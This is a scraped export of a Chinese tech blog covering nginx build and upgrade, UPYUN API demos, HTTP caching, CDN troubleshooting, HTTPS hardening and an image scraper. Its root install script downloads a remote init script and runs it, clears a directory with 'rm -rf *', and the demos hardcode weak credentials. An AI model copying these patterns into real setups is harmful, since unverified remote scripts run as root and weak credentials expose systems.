cd /usr/local/nginx/sbin/ # ./nginx -V nginx version: nginx/1.0.1 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-11) (GCC) built with OpenSSL 1.0.2l 25 May 2017 TLS SNI support enabled configure arguments: --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/root/pcre-8.41 --with-http_ssl_module --with-zlib=/root/zlib-1.2.11 --with-openssl=/root/openssl-1.0.2l 启动 # cd /usr/local/nginx/sbin/ # ./nginx 然后访问 5.关闭 # ps aux | grep nginx root 30596 0.0 0.0 18840 824 ? Ss 11:21 0:00 nginx: master process ./nginx www 30597 0.0 0.1 19292 1784 ? S 11:21 0:00 nginx: worker process root 30607 0.0 0.0 112644 960 pts/0 R+ 11:23 0:00 grep --color=auto nginx # kill -9 30596 # ps aux | grep nginx www 30597 0.0 0.1 19292 1784 ? S 11:21 0:00 nginx: worker process root 30609 0.0 0.0 112644 956 pts/0 R+ 11:24 0:00 grep --color=auto nginx # kill -9 30597 # ps aux | grep nginx root 30611 0.0 0.0 112644 956 pts/0 R+ 11:24 0:00 grep --color=auto nginx但是这样关闭很费劲,我们创建一个脚本来启动停止和重启 nginx # vim /etc/init.d/nginx然后加入如下内容 #! /bin/sh # chkconfig: 2345 55 25 # Description: Startup script for nginx webserver on Debian. Place in /etc/init.d and # run &apos;update-rc.d -f nginx defaults&apos;, or use the appropriate command on your # distro. For CentOS/Redhat run: &apos;chkconfig --add nginx&apos; ### BEGIN INIT INFO # Provides: nginx # Required-Start: $all # Required-Stop: $all # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: starts the nginx web server # Description: starts nginx using start-stop-daemon ### END INIT INFO PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin NAME=nginx NGINX_BIN=/usr/local/nginx/sbin/$NAME CONFIGFILE=/usr/local/nginx/conf/$NAME.conf PIDFILE=/usr/local/nginx/logs/$NAME.pid if [ -s /bin/ss ]; then StatBin=/bin/ss else StatBin=/bin/netstat fi case &quot;$1&quot; in start) echo -n &quot;Starting $NAME... &quot; if $StatBin -tnpl | grep -q nginx;then echo &quot;$NAME (pid `pidof $NAME`) already running.&quot; exit 1 fi $NGINX_BIN -c $CONFIGFILE if [ &quot;$?&quot; != 0 ] ; then echo &quot; failed&quot; exit 1 else echo &quot; done&quot; fi ;; stop) echo -n &quot;Stoping $NAME... &quot; if ! $StatBin -tnpl | grep -q nginx; then echo &quot;$NAME is not running.&quot; exit 1 fi $NGINX_BIN -s stop if [ &quot;$?&quot; != 0 ] ; then echo &quot; failed. Use force-quit&quot; exit 1 else echo &quot; done&quot; fi ;; status) if $StatBin -tnpl | grep -q nginx; then PID=`pidof nginx` echo &quot;$NAME (pid $PID) is running...&quot; else echo &quot;$NAME is stopped.&quot; exit 0 fi ;; force-quit|kill) echo -n &quot;Terminating $NAME... &quot; if ! $StatBin -tnpl | grep -q nginx; then echo &quot;$NAME is is stopped.&quot; exit 1 fi kill `pidof $NAME` if [ &quot;$?&quot; != 0 ] ; then echo &quot; failed&quot; exit 1 else echo &quot; done&quot; fi ;; restart) $0 stop sleep 1 $0 start ;; reload) echo -n &quot;Reload service $NAME... &quot; if $StatBin -tnpl | grep -q nginx; then $NGINX_BIN -s reload echo &quot; done&quot; else echo &quot;$NAME is not running, can&apos;t reload.&quot; exit 1 fi ;; configtest) echo -n &quot;Test $NAME configure files... &quot; $NGINX_BIN -t ;; *) echo &quot;Usage: $0 {start|stop|restart|reload|status|configtest|force-quit|kill}&quot; exit 1 ;; esac然后赋予其可执行权限 # chmod +x /etc/init.d/nginx启动 nginx # chkconfig nginx on # /etc/init.d/nginx restart Stoping nginx... nginx is not running. Starting nginx... done升级 nginx 并且隐藏版本号比如我们要升级 nginx为1.13.1 # wget -c https://nginx.org/download/nginx-1.13.4.tar.gz # cd nginx-1.13.4替换src/core/nginx.h如下部分的内容，修改 nginx 为 awne，将版本号改问1.0.0 #define nginx_version 1000000 #define NGINX_VERSION &quot;1.0.0&quot; #define NGINX_VER &quot;awen/&quot; NGINX_VERSION这个内容通常会在 http 响应头中显示 Server:nginx/1.0.1替换src/http/ngx_http_header_filter_module.c static u_char ngx_http_server_string[] = &quot;Server: nginx&quot; CRLF; 这个内容也是在 http 响应头中显示 替换src/http/ngx_http_special_response.c 中的如下内容中的 nginx 为 awen static u_char ngx_http_error_tail[] = &quot;&lt;hr&gt;&lt;center&gt;awen&lt;/center&gt;&quot; CRLF &quot;&lt;/body&gt;&quot; CRLF &quot;&lt;/html&gt;&quot; CRLF ; 这个内容通常是在 body 里面显示 然后我们还用上面的编译参数 # ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/root/pcre-8.41 --with-http_ssl_module --with-zlib=/root/zlib-1.2.11 --with-openssl=/root/openssl-1.0.2l之后我们 # make 注意，升级时，此处不需要 make install 然后我们停止 nginx，并且将编译好的文件拷贝/usr/local/nginx/sbin/进行替换 # /etc/init.d/nginx stop Stoping nginx... done # cp ./objs/nginx /usr/local/nginx/sbin/ cp: overwrite ‘/usr/local/nginx/sbin/nginx’? y然后重启 nginx,访问查看 一键安装脚本#!/bin/bash #Auth:awen #E-mail:hi@awen.me install_nginx(){ DIR=&quot;/opt/nginx/&quot; ZLIB=&quot;zlib-1.2.11.tar.gz&quot; ZLIB_DIR=&quot;zlib-1.2.11&quot; PCRE=&quot;pcre-8.41.tar.gz&quot; PCRE_DIR=&quot;pcre-8.41&quot; OPENSSL=&quot;openssl-1.0.2l.tar.gz&quot; OPENSSL_DIR=&quot;openssl-1.0.2l&quot; NGINX=&quot;nginx-1.12.1.tar.gz&quot; NGINX_DIR=&quot;nginx-1.12.1&quot; if [ ! -d &quot;/opt/nginx&quot; ];then mkdir -p /opt/nginx else cd ${DIR} rm -rf * fi yum -y update yum -y install gcc gcc-c++ pcre-devel openssl-devel zlib-devel wget cd ${DIR} #install zlib if [ ! -f &quot;$ZLIB&quot; ];then wget -c -4 http://zlib.net/${ZLIB} -O ${DIR}${ZLIB} tar zxvf ${DIR}${ZLIB} cd ${DIR}${ZLIB_DIR} ./configure make make install fi # install pcre cd ${DIR} if [ ! -f &quot;$PCRE&quot; ];then wget -c -4 https://ftp.pcre.org/pub/pcre/${PCRE} -O ${DIR}${PCRE} tar zxvf pcre-8.41.tar.gz if [ -d &quot;/pcre-8.41&quot; ];then cd pcre-8.41 ./configure make &amp;&amp; make install fi fi # install openssl cd ${DIR} if [ ! -f &quot;$OPENSSL&quot; ];then wget -c -4 https://www.openssl.org/source/${OPENSSL} -O ${DIR}${OPENSSL} tar zxvf ${OPENSSL} fi groupadd www useradd -s /sbin/nologin -g www www cd ${DIR} if [ ! -f &quot;$NGINX&quot; ];then wget -c -4 https://nginx.org/download/${NGINX} -O ${DIR}${NGINX} tar zxvf ${NGINX} cd ${NGINX_DIR} ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=${DIR}${PCRE_DIR} --with-http_ssl_module --with-zlib=${DIR}${ZLIB_DIR} --with-openssl=${DIR}${OPENSSL_DIR} make &amp;&amp; make install fi wget -c -4 https://file.awen.me/script/nginx.sh mv nginx.sh /etc/init.d/nginx chmod +x /etc/init.d/nginx /etc/init.d/nginx restart chkconfig nginx on } install_nginx","categories":[],"tags":[]},{"title":"又拍云异步视频处理demo","slug":"又拍云异步视频处理demo","date":"2017-08-23T12:49:51.000Z","updated":"2021-02-26T06:05:29.320Z","comments":true,"path":"posts/59441.html","link":"","permalink":"https://awen.me/posts/59441.html","excerpt":"开门见山，直接看代码吧！主要是几点，不管用什么语言 第一，签名一定要计算对 第二，参数不要错传，漏传 第三，按照要求拼接 第四，帐号密码不要错了 第五，请求头一定要传时间、认证信息和文件类型","text":"开门见山，直接看代码吧！主要是几点，不管用什么语言 第一，签名一定要计算对 第二，参数不要错传，漏传 第三，按照要求拼接 第四，帐号密码不要错了 第五，请求头一定要传时间、认证信息和文件类型 code#!/usr/bin/python3 # -*-coding:utf-8-*- import hashlib import hmac import base64 import datetime import requests import json import urllib.parse def b64(s): return base64.b64encode(s.encode()).decode() def httpdate_rfc1123(dt=None): dt = dt or datetime.datetime.utcnow() return datetime.datetime.utcnow().strftime(&apos;%a, %d %b %Y %H:%M:%S GMT&apos;) def sign(username, password, method, uri, date): signarr = [method, uri, date] signstr = &apos;&amp;&apos;.join(signarr) signstr = base64.b64encode( hmac.new(password.encode(), signstr.encode(), digestmod=hashlib.sha1).digest() ).decode() return &apos;UPYUN %s:%s&apos; % (username, signstr) bucket = &quot;file201503&quot; operator = &quot;admin&quot; password = &quot;123456&quot; password_md5 = hashlib.md5(password.encode()).hexdigest() headers = {} headers[&apos;Date&apos;] = httpdate_rfc1123() headers[&apos;Authorization&apos;] = sign(operator, password_md5, &apos;POST&apos;, &apos;/pretreatment/&apos;, headers[&apos;Date&apos;]) headers[&apos;Content-Type&apos;] = &apos;application/x-www-form-urlencoded&apos; def main(): tasks = { &quot;type&quot;: &quot;video&quot;, &quot;avopts&quot;: &quot;/s/240p(4:3)/as/1/r/30&quot;, &quot;return_info&quot;: True, &quot;save_as&quot;: &quot;/a/b.mp4&quot; } # print(tasks) # {&apos;type&apos;: &apos;video&apos;, &apos;save_as&apos;: &apos;/a/b.mp4&apos;, &apos;return_info&apos;: True, &apos;avopts&apos;: &apos;/s/240p(4:3)/as/1/r/30&apos;} data = { &apos;source&apos;: &apos;/BBB/test.mp4&apos;, &apos;service&apos;: bucket, &apos;notify_url&apos;: &apos;http://lacewing.cc:8090/echo&apos;, &apos;accept&apos;: &apos;json&apos;, &apos;tasks&apos;: base64.b64encode(json.dumps([tasks]).encode()).decode() } # print(data) # {&apos;tasks&apos;: &apos;W3sidHlwZSI6ICJ2aWRlbyIsICJhdm9wdHMiOiAiL3MvMjQwcCg0OjMpL2FzLzEvci8zMCIsICJyZXR1cm5faW5mbyI6IHRydWUsICJzYXZlX2FzIjogIi9hL2IubXA0In1d&apos;, &apos;source&apos;: &apos;/BBB/test.mp4&apos;, &apos;accept&apos;: &apos;json&apos;, &apos;service&apos;: &apos;file201503&apos;, &apos;notify_url&apos;: &apos;http://lacewing.cc:8090/echo&apos;} body = urllib.parse.urlencode(data) # print(body) # 得到的结果如下accept=json&amp;source=%2FBBB%2Ftest.mp4&amp;notify_url=http%3A%2F%2Flacewing.cc%3A8090%2Fecho&amp;tasks=W3sicmV0dXJuX2luZm8iOiB0cnVlLCAidHlwZSI6ICJ2aWRlbyIsICJzYXZlX2FzIjogIi9hL2IubXA0IiwgImF2b3B0cyI6ICIvcy8yNDBwKDQ6MykvYXMvMS9yLzMwIn1d&amp;service=file201503 response = requests.request(&quot;POST&quot;, &quot;http://p0.api.upyun.com/pretreatment/&quot;, data=body, headers=headers) print(response.text) if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"浏览器的缓存机制和CDN的缓存机制","slug":"浏览器的缓存机制和CDN的缓存机制","date":"2017-08-22T02:48:46.000Z","updated":"2021-02-26T06:05:29.345Z","comments":true,"path":"posts/47308.html","link":"","permalink":"https://awen.me/posts/47308.html","excerpt":"本篇主要讲解浏览器的缓存机制和CDN的缓存机制。 我们在打开浏览器访问一个页面的时候，通常有两个头来控制文件的缓存过期时间，一个是 Expires，一个是 Cache-Control，不过 Expires 是 HTTP/1.0 标准的东西，目前主流的都是 HTTP/1.1 。所以重点将下 Cache-Control。 如果同时有 Expires 和Cache-Control，Cache-control 的优先级要高于 Expires。","text":"本篇主要讲解浏览器的缓存机制和CDN的缓存机制。 我们在打开浏览器访问一个页面的时候，通常有两个头来控制文件的缓存过期时间，一个是 Expires，一个是 Cache-Control，不过 Expires 是 HTTP/1.0 标准的东西，目前主流的都是 HTTP/1.1 。所以重点将下 Cache-Control。 如果同时有 Expires 和Cache-Control，Cache-control 的优先级要高于 Expires。 Cache-ControlCache-Control的值可以为：public、private、no-cache、no- store、no-transform、must-revalidate、proxy-revalidate、max-age。 指令含义如下： Public:指示响应可被任何缓存区缓存。 Private:指示对于单个用户的整个或部分响应消息，不能被共享缓存处理。这允许服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效。 no-cache:指示请求或响应消息不能缓存 no-store:用于防止重要的信息被无意的发布。在请求消息中发送将使得请求和响应消息都不使用缓存。 max-age:指示客户机可以接收生存期不大于指定时间（以秒为单位）的响应。 min-fresh:指示客户机可以接收响应时间小于当前时间加上指定时间的响应。 max-stale:指示客户机可以接收超出超时期间的响应消息。如果指定max-stale消息的值，那么客户机可以接收超出超时期指定值之内的响应消息。 如上图所示，同时有: expires:Sun, 03 Sep 2017 02:59:56 GMT cache-control:public, must-revalidate, max-age=1036800 则 cache-control的优先级高与expires，其表示该图片文件缓存时间为1036800秒后过期 Last-Modified/If-Modified-SinceLast-Modified/If-Modified-Since要配合Cache-Control使用。 Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉浏览器资源的最后修改时间。 If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源又被改动过，则响应整片资源内容（写在响应消息包体内），HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省浏览)，告知浏览器继续使用所保存的cache。 Etag/If-None-MatchEtag/If-None-Match也要配合Cache-Control使用。 Etag：web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识,Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。 If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。 如上图所示的 etag:”4BEB88555ABD8D7F519606884054A5AE” 在又拍云etag其实就是文件的md5，但是缩略图除外，因为缩略图是动态生成的 为什么有Last-Modified还要 Etag？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题: Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间 如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形 Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag是可以一起使用的，服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。age age 字段表示文件在服务器缓存的时间，单位是秒。Age消息头的值通常接近于0。表示此消息对象刚刚从原始服务器获取不久；其他的值则是表示代理服务器当前的系统时间与此应答消息中的通用消息头 Date 的值之差。 参考https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Age 用户行为与缓存浏览器缓存行为还有用户的行为有关！！！ 用户行为 Expires/Cache-Control Last-Modified/Etag 地址栏输入回车 有效 有效 页面链接跳转 有效 有效 新开窗口 有效 有效 前进·后退 有效 有效 F5 刷新 无效 有效 Ctrl+F5刷新 无效 无效 浏览器的请求过程 http缓存是基于HTTP协议的浏览器文件级缓存机制。即针对文件的重复请求情况下，浏览器可以根据协议头判断从服务器端请求文件还是从本地读取文件，chrome控制台下的Frames即展示的是浏览器的http文件级缓存。以下是浏览器缓存的整个机制流程。主要是针对重复的http请求，在有缓存的情况下判断过程主要分3步： 判断expires，如果未过期，直接读取http缓存文件，不发http请求，否则进入下一步判断是否含有etag，有则带上if-none-match发送请求，未修改返回304，修改返回200，否则进入下一步判断是否含有last-modified，有则带上if-modified-since发送请求，无效返回200，有效返回304，否则直接向服务器请求 第一次请求 浏览器再次请求 参考https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn 参考：《HTTP权威指南》 web 服务器配置以nginx 为例，参考官网Module ngx_http_headers_module 配置","categories":[],"tags":[{"name":"缓存","slug":"缓存","permalink":"https://awen.me/tags/%E7%BC%93%E5%AD%98/"}]},{"title":"又拍云的签名到底怎么计算的？","slug":"又拍云的签名到底怎么计算的？","date":"2017-08-18T12:50:04.000Z","updated":"2021-02-26T06:05:29.320Z","comments":true,"path":"posts/42821.html","link":"","permalink":"https://awen.me/posts/42821.html","excerpt":"相信不少使用又拍云 sdk 上传文件到存储的人都碰到过一个问题，那就是又拍云上传要传的认证签名头，好复杂呀！各种拼接然后加上加密，到底怎么算呢？今天，我给大家捋一捋。 首先，请你仔细阅读一遍文档 我们需要知道的是，在你上传文件的请求头里，需要加上这么一个头信息 Authorization: UPYUN &lt;Operator&gt;:&lt;Signature&gt; 其中的 Authorization 是请求头，UPYUN 直接照写，operator 是操作员；然后 signature 是签名，主要是这个签名计算稍微复杂点。 按照官网的内容，我们把对应的参数拼接起来","text":"相信不少使用又拍云 sdk 上传文件到存储的人都碰到过一个问题，那就是又拍云上传要传的认证签名头，好复杂呀！各种拼接然后加上加密，到底怎么算呢？今天，我给大家捋一捋。 首先，请你仔细阅读一遍文档 我们需要知道的是，在你上传文件的请求头里，需要加上这么一个头信息 Authorization: UPYUN &lt;Operator&gt;:&lt;Signature&gt; 其中的 Authorization 是请求头，UPYUN 直接照写，operator 是操作员；然后 signature 是签名，主要是这个签名计算稍微复杂点。 按照官网的内容，我们把对应的参数拼接起来 代码#!/usr/bin/env python #-*-coding:utf-8-*- from hashlib import sha1 import hashlib import hmac import base64 operator=&quot;operator123&quot; hash_md5 = hashlib.md5(&quot;password123&quot;) password = hash_md5.hexdigest()#得到值是482c811da5d5b4bc6d497ffa98491e38 options = &apos;PUT&amp;/upyun-temp/demo.jpg!awen)&amp;Wed, 09 Nov 2016 14:26:58 GMT&amp;7ac66c0f148de9519b8bd264312c4d64&apos; sign = base64.b64encode(hmac.new(password,options,sha1).digest()) print(sign)最后的运行结果就和官网的例子中的结果一样啦！你所需要做的，就是把里面的参数替换成你自己的就可以了。 注意:REST API 签名有效期为 30 分钟；FORM API 回调通知签名有效期由用户自行确定，建议设置为 30 分钟。 说完了签名 那表单上传除了要计算签名还有个Policy，其实是一样的。都是把一些参数加进来，然后进行计算，最后得出一个结果，需要注意的是，在我的印象中，99%的人都会在这个地方遇到各种问题，然后调试的时候报400 或401错误，比如： 参数少传或错传，比如本地路径写错了或服务名没写进去进行拼接。 拼接错误，各种参数之间要用&amp;连接，有的参数写到一块去了。 算法用错了，导致计算记过不一样。 一些参数写死了，比如 Date，这个最好是动态获取，传个变量吧，不要写死了。 环境不一样，有的是本地调试 ok，换个环境就不行了，注意检查2台设备的时间是不是一致。 把登录控制台的账号密码写成了操作员和操作员密码。 另外有的人对“HMAC-SHA1 输出的必须是原生的二进制数据”不理解，不理解就看上面的代码吧！ 需要转换为 json 的地方没转换，需要 base64编码的地方没编码。 大概就上面这些，然后报错也可以看下文档","categories":[],"tags":[{"name":"sign","slug":"sign","permalink":"https://awen.me/tags/sign/"}]},{"title":"客服同学第一期培训","slug":"客户同学第一期培训","date":"2017-08-18T05:57:40.000Z","updated":"2021-02-26T06:05:29.332Z","comments":true,"path":"posts/32114.html","link":"","permalink":"https://awen.me/posts/32114.html","excerpt":"如何判断节点真的有问题通常都是先要找客户拿到对应的节点IP 可以通过 telnet 命令来测试下「80」 和「443」 端口是否是通的 telnet ip port例如 telnet 121.42.148.64 80还可以通过 ping 来判断 IP 是否是通的 ping ip","text":"如何判断节点真的有问题通常都是先要找客户拿到对应的节点IP 可以通过 telnet 命令来测试下「80」 和「443」 端口是否是通的 telnet ip port例如 telnet 121.42.148.64 80还可以通过 ping 来判断 IP 是否是通的 ping ip 例如 ping 121.42.148.64如果 ping 节点超时，请立即反馈运维排查如果 telnet 端口超时或返回时间较长，也请反馈运维 怎么判断域名解析是否在我们这边1.windows 或mac 电脑的小伙伴都可以打开(CMD or 终端)，输入 nslookup domain例如 ➜ ~ nslookup awen.me Server: 223.5.5.5 Address: 223.5.5.5#53 Non-authoritative answer: Name: awen.me Address: 121.42.148.64 # 查看该IP 是否是属于我们的，可以去控制台查对比下上面的 ➜ ~ nslookup file.awen.me Server: 223.5.5.5 Address: 223.5.5.5#53 Non-authoritative answer: file.awen.me canonical name = fileawenme.b0.aicdn.com. # 表示这个域名做了cname解析到我们这边，因为包含xxxx.b0.aicdn.com fileawenme.b0.aicdn.com canonical name = nm.ctn.aicdn.com. Name: nm.ctn.aicdn.com Address: 183.158.35.41此外还有一个dig命令，考虑windows 用户没有这个命令，可以做下了解 如何判断文件是否更新1.浏览器访问文件，最好是chrome， 在页面中间点击检查 或者点击右上角的三个点，选择更多工具–开发者工具，后面有快捷键，不同的系统快捷键是不一样的 第一次打开，你们的界面可能是这样的 点击侧边栏的三个点，选择dock side 为蓝色部分的图标 然后就是这样排版了 切换到Network 选项卡，刷新页面就可以看到加载的文件列表 选择一个，如果你给客户测的是单个url，比如一个图片，这列表里只会显示1个，直接点击，查看他的头信息 在这个头信息里面，我们主要看几个字段 |字段| 说明| 举例|| — | — | — | —|| age | 表示在我们CDN 缓存的时间，单位是秒 |age:674805 ||cache-control| 表示设置的最大缓存时间，单位是秒|max-age=691200，如果是max-age=0 则说明不缓存||last-modified| 表示文件的最后更新时间，单位是GMT时间，所以要+8|Wed, 09 Dec 2015 05:26:43 GMT||content-type|文件的类型，如果文件类型是二进制，则会自动下载，如果浏览器不能识别文件类型也会直接下载|content-type:application/javascript 表示是一个js文件||etag|表示文件的唯一标识，在CDN 源文件通常是文件的MD5[缩略图不是]|etag:”EA8159CA9B44264EAE1FDC6B507D8180”||server|表示服务器的名称，通常我们这边都是server:marco/1.6|server:nginx/1.12.1||status|表示文件的状态，正常的状态有200 301 302，如果是404 表示文件不存在，如果是5xx 表示服务器有错误，通常要搭配x-source看是不是源站问题|status:200||x-source|表示源的状态，如果是U/200表示文件是在存储中返回200，C/200 表示源站返回200|x-source:U/200||x-request-id|请求返回的唯一ID，通常可以定位文件故障|x-request-id:524b1cf5d98a7b81e490f95425a0022; e66efbce8fc2072477ede463bcbb2d43||x-mirror-request-id|表示该域名开启了镜像服务|x-mirror-request-id:2ff80f2fa6f9fb3b3ab0a3d790992478||strict-transport-security|表示开启了HSTS|strict-transport-security:max-age=15552000; includeSubDomains; preload||Request Method|请求的方式|GET POST HEAD||Remote Address|请求返回的节点IP和端口80表示http 443表示https|Remote Address:183.158.35.41:443||Referrer Policy|表示空referer，如果返回403，表示客户可能开启了域名防盗链，禁止了referer为空|Referrer Policy:no-referrer-when-downgrade| 通过上面的表，我们主要看缓存相关的字段值判断文件是否缓存，打个比方，如果客户刚刚刷新完文件，但是反馈返回的文件还是老的文件，可以看age是不是有变化，如果刚刚刷新，age肯定值很小，并且查最后的修改时间是什么时候，注意要+8 会点技术没坏处1.推荐看下我录制的LINUX 基础教程，自己搭建个虚拟机学习更多命令 链接: https://pan.baidu.com/s/1c23uE0S 密码: hg8c","categories":[],"tags":[]},{"title":"又拍云视频转换成gif","slug":"又拍云视频转换成gif","date":"2017-08-17T12:39:56.000Z","updated":"2021-02-26T06:05:29.321Z","comments":true,"path":"posts/22895.html","link":"","permalink":"https://awen.me/posts/22895.html","excerpt":"","text":"我们把视频上传到存储，特别是一些小视频。我们希望上传后获取视频的一部分gif图片作为缩略图，这个时候，我们可以通过又拍云的云处理接口来把视频剪辑成一段gif动画，并且又拍云还支持webp格式动画 参数文档 代码我们还是使用python sdk来实现 pip(pip3) install upyun代码 def gif(): up = upyun.UpYun(&apos;servername&apos;, &apos;username&apos;, &apos;password&apos;, timeout=30, endpoint=upyun.ED_AUTO) source = &apos;/BBB/h264.mp4&apos; #视频路径 tasks = [ { &apos;type&apos;: &apos;video&apos;, #视频类型 &quot;avopts&quot;:&quot;/ss/00:02:00/es/00:03:00&quot;, #开始时间和结束时间 &quot;save_as&quot;:&quot;/BBB/test.webp&quot; #保存路径，根据后缀保存为对应的格式文件 } ] notify_url = &apos;http://httpbin.org/post&apos; #回调地址 print(up.pretreat(tasks, source, notify_url)) print(gif())最终效果原始视频 http://file201503.b0.upaiyun.com/BBB/h264.mp4 55M大小 1.GIF转5秒 18M 2.WEBP(需要浏览器支持) 5秒转后1.2M","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"构建一个安全的HTTPS环境","slug":"构建一个安全的HTTPS环境","date":"2017-08-17T06:12:23.000Z","updated":"2021-02-26T06:05:29.343Z","comments":true,"path":"posts/44599.html","link":"","permalink":"https://awen.me/posts/44599.html","excerpt":"在https://www.ssllabs.com/ssltest/ 上，你可以对你的 HTTPS 站点进行评分，如果是A+,则说明你的站点安全性特别高。如图所示","text":"在https://www.ssllabs.com/ssltest/ 上，你可以对你的 HTTPS 站点进行评分，如果是A+,则说明你的站点安全性特别高。如图所示 如何构建一个高安全性的站点那么，如何搭建一个安全性特别高的 HTTPS 类型站点呢？ssllabs 给了我们一份SSL and TLS Deployment Best Practices 有兴趣的可以看下，因为是全英文的。我稍微总结一下： 密钥足够复杂，最好超过2048位，并且要保护好私钥，避免外泄 选择目前主流安全性比较高的签名算法 证书要从可靠的CA厂商申请，因为不可靠的厂商（比如不被主流浏览器信任的证书厂商）会乱修改证书日期，重复签发证书。 使用安全协议，比如TLS1.2 禁止使用不安全的协议，比如SSLV2 SSLV3。 使用安全密码套件 使用完整的证书链 使用HTTP/2 使用OCSP装订 禁止TLS压缩 不缓存敏感信息 采用HSTS 参考配置server { listen 443 ssl http2 default_server; server_name www.awen.me awen.me; index index.html index.htm index.php; root /web; ssl on; ssl_certificate /nginx/ssl/awen/fullchain.cer; ssl_certificate_key /nginx/ssl/awen/awen.me.key; ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_protocols TLSv1.2; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets on; resolver 114.114.114.114 valid=300s; resolver_timeout 10s; if ($request_method !~ ^(GET|HEAD)$ ) { return 444; } add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;; add_header X-Frame-Options deny; add_header X-Content-Type-Options nosniff; add_header CIP $http_x_real_ip; add_header Accept-Ranges bytes; } server { listen 80; server_name _; server_name www.fangwenjun.com fangwennjun.com awen.me www.awen.me; if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } rewrite ^(.*)$ https://awen.me$1 permanent; }","categories":[],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://awen.me/tags/HTTPS/"}]},{"title":"利用bs4抓取图片上传到又拍云","slug":"利用bs4抓取图片上传到又拍云","date":"2017-08-17T03:03:06.000Z","updated":"2021-02-26T06:05:29.317Z","comments":true,"path":"posts/10537.html","link":"","permalink":"https://awen.me/posts/10537.html","excerpt":"我们通过bs4去爬取网页中的图片资源，然后将其上传到又拍云存储 申明，本文图片做完实验已全部删除","text":"我们通过bs4去爬取网页中的图片资源，然后将其上传到又拍云存储 申明，本文图片做完实验已全部删除 代码我们先看下完整代码 #!/usr/bin/env python #-*-coding:utf-8-*- import upyun from bs4 import BeautifulSoup import requests import time up = upyun.UpYun(&apos;servername&apos;, &apos;username&apos;, &apos;password&apos;, timeout=30, endpoint=upyun.ED_AUTO) notify_url = &apos;http://httpbin.org/post&apos; def requrl(url): try: headers = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://pic.hao123.com/static/pic/css/pic_xl_c.css?v=1482838677&quot;} r = requests.get(url,headers=headers) r.raise_for_status() r.encoding = r.apparent_encoding demo = r.text except: print(&quot;请求异常&quot;) soup = BeautifulSoup(demo, &quot;html.parser&quot;) all_images = soup.find_all(&quot;img&quot;) return all_images def fetch(url): for i in url: url = i[&apos;src&apos;] filename = str(int(time.time()))+&quot;.jpg!awen)&quot; print(url) print(filename) fetch_tasks = [ { &apos;url&apos;: url, &apos;random&apos;: False, &apos;overwrite&apos;: True, &apos;save_as&apos;: &apos;/upyun/&apos;+filename, } ] time.sleep(5) print(up.put_tasks(fetch_tasks, notify_url, &apos;spiderman&apos;)) url = requrl(&quot;http://pic.hao123.com/meinv?style=xl&quot;) fetch(url)在开始之前，需要先安装又拍云的库以及requests库和BeautifulSoup pip3 install requests pip3 install upyun pip3 install BeautifulSoup函数requrldef requrl(url): try: headers = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://pic.hao123.com/static/pic/css/pic_xl_c.css?v=1482838677&quot;} r = requests.get(url,headers=headers) r.raise_for_status() r.encoding = r.apparent_encoding demo = r.text except: print(&quot;请求异常&quot;) soup = BeautifulSoup(demo, &quot;html.parser&quot;) all_images = soup.find_all(&quot;img&quot;) return all_images这个函数的作用是传入一个url，会去请求这个url并获取页面中所有的img元素并返回 函数fetchdef fetch(url): for i in url: url = i[&apos;src&apos;] filename = str(int(time.time()))+&quot;.jpg!awen)&quot; print(url) print(filename) fetch_tasks = [ { &apos;url&apos;: url, &apos;random&apos;: False, &apos;overwrite&apos;: True, &apos;save_as&apos;: &apos;/upyun/&apos;+filename, } ] time.sleep(5) print(up.put_tasks(fetch_tasks, notify_url, &apos;spiderman&apos;)) url = requrl(&quot;http://pic.hao123.com/meinv?style=xl&quot;) 